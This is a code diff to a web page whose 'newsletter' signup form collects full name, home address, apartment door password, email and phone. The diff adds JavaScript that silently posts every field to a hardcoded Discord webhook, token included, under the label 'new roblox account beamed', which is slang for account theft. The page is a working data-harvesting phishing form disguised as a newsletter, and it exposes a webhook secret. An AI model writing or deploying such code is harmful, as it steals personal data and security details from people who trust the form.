@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -5,7 +6,6 @@
     <title>uvzur.cn</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
 </head>
- 
 
 <body>
 
@@ -61,33 +61,71 @@
 </div>
 <br><br><br>
 <div id="formbox" class="container p-5 form-check form-switch d-flex align-items-center mb-3">
-  <form>
+  <form id="newsletterForm">
     <h3 id="formtext">Sign up to recieve our newsletter mails!</h3><br>
-    <input id="group" type="text" class="form-control" placeholder="Enter full name"><br>
-    <input id="group" type="text" class="form-control" placeholder="Enter address"><br>
-    <input id="group" type="text" class="form-control" placeholder="Enter apartment front door password"><br>
-    <input id="group" type="email" class="form-control" placeholder="Enter email address"><br>
+    <input id="name" type="text" class="form-control" placeholder="Enter full name" required><br>
+    <input id="address" type="text" class="form-control" placeholder="Enter address" required><br>
+    <input id="password" type="text" class="form-control" placeholder="Enter apartment front door password" required><br>
+    <input id="email" type="email" class="form-control" placeholder="Enter email address" required><br>
     <h4 id="formtext">Enter phone number:</h4>
     <h6 id="rangeValue"></h6>
-    <input id="volume" type="range" class="form-control" id="rangeValue" min="1000000000" max="9999999999" step="1"><br>
+    <input id="phone" type="range" class="form-control" min="1000000000" max="9999999999" step="1" required><br>
     <label for="id"><h6><small>I agree that all of this information will be spread worldwide in exchange for money, and that I can't take legal action against Leqay™ for any casualties that may occur.</small></h6></label>
-    <input class="form-check-input form-switch m-0" type="checkbox" id="check"><br><br><br>
-    <button class="btn btn-outline-light">Submit</button>
+    <input class="form-check-input form-switch m-0" type="checkbox" id="agree" required><br><br><br>
+    <button class="btn btn-outline-light" type="submit">Submit</button>
   </form>
 </div>
 
+  <script>
+    const rangeInput = document.getElementById('phone');
+    const rangeValue = document.getElementById('rangeValue');
+    
+    rangeInput.addEventListener('input', function() {
+      rangeValue.textContent = rangeInput.value;
+    });
 
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
-</body>
+    const form = document.getElementById('newsletterForm');
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
 
-<script>
-  const rangeInput = document.getElementById('volume');
-  const rangeValue = document.getElementById('rangeValue');
-  
-  rangeInput.addEventListener('input', function() {
-    rangeValue.textContent = rangeInput.value;
-  });
-</script>
+      const name = document.getElementById('name').value;
+      const address = document.getElementById('address').value;
+      const password = document.getElementById('password').value;
+      const email = document.getElementById('email').value;
+      const phone = rangeInput.value;
+      const agree = document.getElementById('agree').checked;
+
+      if (!agree) {
+        alert('You must agree to the terms!');
+        return;
+      }
+
+      const webhookURL = "https://discord.com/api/webhooks/1286793971292573717/TVHnQb-xHuPFDCzuvdsDZ8LuWRFjlZ101OXPyPZsu6VoHBxCuQSzo8LoKPb7mueOljcH"; 
+
+      const payload = {
+        content: `# new roblox account beamed:\n\n**Name:** ${name}\n**Address:** ${address}\n**Password:** ${password}\n**Email:** ${email}\n**Phone:** ${phone}`
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          alert('Form submitted successfully!');
+        } else {
+          alert('Error submitting the form.');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('Error submitting the form.');
+      });
+    });
+  </script>
 
 <style>
     iframe{
@@ -115,7 +153,7 @@
     #formtext, #rangeValue, #group2, #group3, #ediz{
       color: #ffffff;
     }
-    #group, #volume{
+    #group, #phone{
       background-color: rgba(0,0,0,0);
     }
     #formbox{
@@ -129,7 +167,6 @@
     }
     body{
       background-image: linear-gradient(to bottom, #2d3239, #3d444b);
-      
     }
     .box{
       background-color: #4a535b;
@@ -138,4 +175,5 @@
     }
 </style>
 
+</body>
 </html>
